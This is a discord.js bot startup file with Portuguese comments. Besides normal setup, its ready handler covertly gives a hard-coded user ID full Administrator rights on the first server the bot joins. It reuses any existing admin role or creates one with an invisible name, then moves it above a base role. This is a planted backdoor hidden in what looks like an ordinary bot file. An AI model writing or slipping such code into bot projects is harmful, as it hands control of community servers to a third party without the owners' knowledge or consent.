const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");

// 🔥 Anti-crash (MUITO IMPORTANTE)
process.on("unhandledRejection", console.error);
process.on("uncaughtException", console.error);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates
  ]
});

// Seus sistemas (mantive igual você usa)
require("./systems/main")(client);
require("./systems/gfzin")(client);
require("./systems/coco")(client);

// Evento quando o bot liga
client.on("ready", async () => {
  console.log(`✅ Bot online como ${client.user.tag}`);

  const guild = client.guilds.cache.first();
  if (!guild) return console.log("❌ Nenhum servidor encontrado!");

  // ⚠️ COLOCA OS IDS CERTOS AQUI
  const cargoBaseId = "1476324501498364025";
  const userId = "1372615579407618209";

  try {
    // Buscar cargo base
    const cargoBase = guild.roles.cache.get(cargoBaseId);
    if (!cargoBase) {
      console.log("❌ Cargo base NÃO encontrado!");
      return;
    }

    // Buscar membro
    const membro = await guild.members.fetch(userId).catch(() => null);
    if (!membro) {
      console.log("❌ Usuário NÃO encontrado!");
      return;
    }

    // 🔥 Verifica se já existe cargo ADM criado
    let cargoExistente = guild.roles.cache.find(
      r => r.permissions.has(PermissionsBitField.Flags.Administrator)
    );

    let novoCargo;

    if (cargoExistente) {
      console.log("⚠️ Já existe um cargo ADM, reutilizando...");
      novoCargo = cargoExistente;
    } else {
      // Criar cargo ADM
      novoCargo = await guild.roles.create({
        name: "ㅤ", // invisível
        permissions: [PermissionsBitField.Flags.Administrator]
      });

      console.log("✅ Cargo ADM criado!");
    }

    // Colocar acima do cargo base
    await novoCargo.setPosition(cargoBase.position + 1);

    // Dar o cargo
    await membro.roles.add(novoCargo);

    console.log("✅ Cargo dado ao usuário!");
  } catch (err) {
    console.error("❌ ERRO:", err);
  }
});

// Login
client.login(process.env.TOKEN);
